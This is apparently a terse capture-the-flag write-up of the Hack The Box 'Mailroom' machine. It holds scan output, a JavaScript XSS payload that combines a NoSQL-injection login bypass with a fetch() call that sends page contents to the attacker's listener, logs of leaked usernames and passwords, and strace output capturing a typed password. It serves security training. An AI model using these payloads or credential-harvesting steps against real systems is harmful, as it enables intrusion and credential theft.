---
layout: post
title: htb mailroom
date: 2023-04-23 11:07 +0200
hidden: true
---

## Nmap scan

```bash
┌──(root㉿rether)-[~]
└─# nmap -A 10.10.11.209
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-23 11:04 CEST
Nmap scan report for mailromm.htb (10.10.11.209)
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA)
|   256 821beb758b9630cf946e7957d9ddeca7 (ECDSA)
|_  256 19fb45feb9e4275de5bbf35497dd68cf (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: The Mail Room
|_http-server-header: Apache/2.4.54 (Debian)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/23%OT=22%CT=1%CU=35819%PV=Y%DS=2%DC=T%G=Y%TM=6444F4C
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)
```

## HTTP - port 80

!["Mailroom Home"](/assets/img/posts/mailroom/mailroom-home.png "Mailroom Home")

```bash
┌──(rether㉿rether)-[~]
└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u mailroom.htb --append-domain
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://mailroom.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/04/23 11:17:20 Starting gobuster in VHOST enumeration mode
===============================================================
Found: git.mailroom.htb Status: 200 [Size: 13201]
Progress: 4827 / 4990 (96.73%)
===============================================================
2023/04/23 11:17:32 Finished
===============================================================
```

We found a subdomain, its a git domain,

var http = new XMLHttpRequest();
http.open('POST', "http://staff-review-panel.mailroom.htb/index.php", true);
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.onload = function () {
fetch("http://10.10.14.11:4444/out?" + encodeURI(btoa(this.responseText)));
};
http.send("email[$ne]=yu8@yu8.yu8&password[$ne]=yu8")

```bash
┌──(rether㉿rether)-[~/Documents/HTB/machines/mailroom]
└─$ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.11.209 - - [23/Apr/2023 11:43:41] "GET /pwneduser.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 11:43:42] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 11:43:42] "GET /out?n HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 11:43:42] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 11:43:42] "GET /out?an HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 11:43:43] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 11:43:43] "GET /out?tan HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 11:44:15] "GET /pwneduser.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 11:44:38] "GET /pwneduser.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 11:44:39] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 11:44:39] "GET /out?tan HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 11:44:39] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 11:44:39] "GET /out?stan HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 11:44:41] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 11:44:41] "GET /out?istan HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 11:45:26] "GET /pwneduser.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 11:45:55] "GET /pwneduser.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 11:45:56] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 11:45:56] "GET /out?istan HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 11:45:57] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 11:45:57] "GET /out?ristan HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 11:45:58] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 11:45:58] "GET /out?tristan HTTP/1.1" 404 -
```

```bash
┌──(rether㉿rether)-[~/Documents/HTB/machines/mailroom]
└─$ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.11.209 - - [23/Apr/2023 12:02:34] "GET /pwnedpass.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 12:02:35] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:02:35] "GET /out?6 HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:02:36] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:02:36] "GET /out?69 HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:02:36] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:02:36] "GET /out?69t HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:02:38] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:02:38] "GET /out?69tr HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:02:56] "GET /pwnedpass.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 12:03:23] "GET /pwnedpass.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 12:03:24] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:03:24] "GET /out?69tr HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:03:25] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:03:25] "GET /out?69tri HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:03:26] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:03:26] "GET /out?69tris HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:03:47] "GET /pwnedpass.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 12:03:48] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:03:48] "GET /out?69tris HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:03:49] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:03:49] "GET /out?69trisR HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:03:51] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:03:51] "GET /out?69trisRu HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:04:08] "GET /pwnedpass.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 12:04:29] "GET /pwnedpass.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 12:04:30] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:04:30] "GET /out?69trisRu HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:04:30] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:04:30] "GET /out?69trisRul HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:04:32] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:04:32] "GET /out?69trisRule HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:05:25] "GET /pwnedpass.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 12:05:44] "GET /pwnedpass.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 12:05:45] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:05:45] "GET /out?69trisRul HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:05:45] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:05:45] "GET /out?69trisRule HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:05:47] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:05:47] "GET /out?69trisRulez HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:06:18] "GET /pwnedpass.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 12:06:19] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:06:19] "GET /out?69trisRule HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:06:20] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:06:20] "GET /out?69trisRulez HTTP/1.1" 404 -
10.10.11.209 - - [23/Apr/2023 12:07:12] "GET /pwnedpass.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 12:07:47] "GET /pwnedpass.js HTTP/1.1" 200 -
10.10.11.209 - - [23/Apr/2023 12:07:48] code 404, message File not found
10.10.11.209 - - [23/Apr/2023 12:07:48] "GET /out?69trisRulez! HTTP/1.1" 404 -
```

tristan@mailroom.htb

password : 69trisRulez!

matthew:HueLover83#

!sEcUr3p4$$w0rd9

```bash
[...]
read(0, "!", 8192)                      = 1
read(0, "s", 8192)                      = 1
read(0, "E", 8192)                      = 1
read(0, "c", 8192)                      = 1
read(0, "U", 8192)                      = 1
read(0, "r", 8192)                      = 1
read(0, "3", 8192)                      = 1
read(0, "p", 8192)                      = 1
read(0, "4", 8192)                      = 1
read(0, "$", 8192)                      = 1
read(0, "$", 8192)                      = 1
read(0, "w", 8192)                      = 1
read(0, "0", 8192)                      = 1
read(0, "1", 8192)                      = 1
read(0, "\10", 8192)                    = 1
read(0, "r", 8192)                      = 1
read(0, "d", 8192)                      = 1
read(0, "9", 8192)                      = 1
```
